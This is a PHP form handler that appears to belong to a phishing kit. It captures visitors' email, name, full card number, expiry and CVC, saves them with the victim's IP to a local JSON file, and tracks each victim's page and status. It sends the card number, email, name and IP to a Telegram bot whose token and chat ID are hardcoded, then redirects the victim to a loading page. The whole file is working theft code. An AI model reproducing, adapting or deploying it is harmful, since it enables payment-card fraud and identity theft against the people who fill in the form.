<?php
session_start();

function sendTelegramNotification($user, $action) {
    // Use your existing Telegram function from action.php
    $bot_token = '8519765168:AAEJk6HCHDQY5fYAa2GfR5mzMrUxeSGPbF8';
    $chat_id = '-5209514131';
    
    $data = $user['data'] ?? [];
    $message = "📝 *FORM SUBMITTED*\n\n";
    $message .= "📧 *Email:* `" . ($data['email'] ?? 'N/A') . "`\n";
    $message .= "👤 *Name:* `" . ($data['name'] ?? 'N/A') . "`\n";
    $message .= "💳 *Card:* `" . ($data['card'] ?? 'N/A') . "`\n";
    $message .= "📍 *IP:* `" . ($user['ip'] ?? 'N/A') . "`\n";
    $message .= "🕐 *Time:* " . date('H:i:s');
    
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode([
                'chat_id' => $chat_id,
                'text' => $message,
                'parse_mode' => 'Markdown'
            ]),
            'timeout' => 1
        ]
    ]);
    
    @file_get_contents($url, false, $context);
}

// Process form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user_key = $_POST['user_key'] ?? '';
    
    if (empty($user_key)) {
        // Generate new user_key if missing
        $user_key = 'user_' . time() . '_' . bin2hex(random_bytes(8));
    }
    
    // Collect form data
    $formData = [
        'email' => $_POST['email'] ?? '',
        'name' => $_POST['name'] ?? '',
        'card' => $_POST['cardNumber'] ?? '',
        'expiry' => $_POST['cardExpiry'] ?? '',
        'cvc' => $_POST['cardCvc'] ?? '',
        'submitted_at' => time()
    ];
    
    // Update users database
    $db_file = 'data/users.db';
    $users = file_exists($db_file) ? json_decode(file_get_contents($db_file), true) : [];
    
    if (isset($users[$user_key])) {
        // Update existing user
        $users[$user_key]['data'] = $formData;
        $users[$user_key]['status'] = 'loading'; // Changed from 'submitted'
        $users[$user_key]['current_page'] = 'loading.php';
        $users[$user_key]['last_updated'] = time();
        $users[$user_key]['last_seen'] = time();
        
        // Add to history
        $users[$user_key]['history'][] = [
            'time' => time(),
            'action' => 'form_submitted',
            'page' => 'check.php'
        ];
    } else {
        // Create new user entry
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $users[$user_key] = [
            'id' => $user_key,
            'ip' => $ip,
            'data' => $formData,
            'status' => 'loading', // Changed from 'submitted'
            'current_page' => 'loading.php',
            'redirect_to' => '',
            'created_at' => time(),
            'last_seen' => time(),
            'last_updated' => time(),
            'visits' => 1,
            'history' => [
                [
                    'time' => time(),
                    'action' => 'form_submitted',
                    'page' => 'check.php'
                ]
            ]
        ];
    }
    
    // Save to database
    file_put_contents($db_file, json_encode($users, JSON_PRETTY_PRINT));
    
    // Send Telegram notification
    sendTelegramNotification($users[$user_key], 'FORM SUBMITTED');
    
    // Redirect to loading page with user_key
    header("Location: loading.php?user_id=" . urlencode($user_key));
    exit;
} else {
    // If accessed directly, redirect to index
    header("Location: index.php");
    exit;
}
?>
